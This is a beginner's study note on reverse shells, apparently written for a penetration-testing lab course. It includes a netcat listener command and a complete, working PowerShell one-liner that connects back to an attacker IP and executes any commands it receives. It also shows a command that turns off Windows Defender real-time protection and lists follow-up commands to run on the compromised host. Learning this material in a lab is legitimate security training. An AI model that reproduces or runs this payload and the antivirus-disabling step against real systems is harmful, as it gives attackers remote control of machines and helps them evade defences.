---
tags: [module/shells-payloads, reverse-shell, netcat, powershell, listener, level/beginner]
---

# Reverse Shells - Beginner's Guide

## What is a Reverse Shell?

A reverse shell is when your attack machine listens for a connection, and the target initiates the connection back to you.

Your Machine (listener) <--- Target (connects)

**Think of it like:** You're waiting by the phone, and the target calls you.

---

## Reverse Shell Diagram

Your Machine starts listener on port 443
    ↓
Target connects back to Your Machine:443
    ↓
Shell session established

---

## Why Reverse Shells Are Better

| Reason | Why |
|--------|-----|
| Firewall evasion | Outbound connections often allowed |
| NAT traversal | Target can connect through NAT |
| Common ports | Port 80/443 usually open outbound |
| Stealth | Harder to detect than incoming |

**The Rule:** Reverse shells are more reliable than bind shells in real-world engagements.

---

## Choosing the Right Port

| Port | Service | Likelihood of Being Open |
|------|---------|--------------------------|
| 80 | HTTP | Very High |
| 443 | HTTPS | Very High |
| 53 | DNS | High |
| 22 | SSH | Medium |
| 445 | SMB | Medium (often outbound blocked) |

**Best Practice:** Use port 443 - it's almost always allowed outbound.

---

## Netcat Listener

Start a listener on your attack machine:

sudo nc -lvnp 443

Options:
- `-l` - Listen mode
- `-v` - Verbose
- `-n` - No DNS resolution
- `-p` - Port number

Output:
Listening on 0.0.0.0 443

---

## PowerShell Reverse Shell

### The Classic One-Liner

On Windows target (run in cmd or PowerShell):

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('YOUR-IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

### What You Must Change

Replace `YOUR-IP` with your actual attack machine IP address.

Example:
'10.10.14.158' instead of 'YOUR-IP'

---

## The Problem: Antivirus

When you try to run the PowerShell one-liner with Defender enabled:

At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.

**What happened:** Windows Defender detected and blocked the payload.

---

## Disabling Windows Defender (For Practice)

### Method 1: Through Settings
- Open Virus & threat protection
- Manage settings
- Turn off Real-time protection

### Method 2: PowerShell (Admin)

Set-MpPreference -DisableRealtimeMonitoring $true

**Note:** This requires administrative privileges.

---

## After Disabling AV

Run the PowerShell one-liner again.

On your attack machine (listener):

sudo nc -lvnp 443

Output:
Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student>

**Success!** You now have a reverse shell.

---

## Testing Your Shell

Once connected, try some commands:

whoami
hostname
ipconfig
dir
cd Desktop
whoami /groups

---

## Key Takeaways

- Reverse shell = target connects to you
- Use common ports (443) to bypass firewalls
- Netcat listens for incoming connections
- PowerShell one-liner is the go-to for Windows
- Always change YOUR-IP to your actual IP
- Antivirus will block known payloads
- You may need to disable AV (if you have admin)
- Practice the one-liner until you know it
- Reverse shells are more reliable than bind shells
- Master this technique - you'll use it constantly
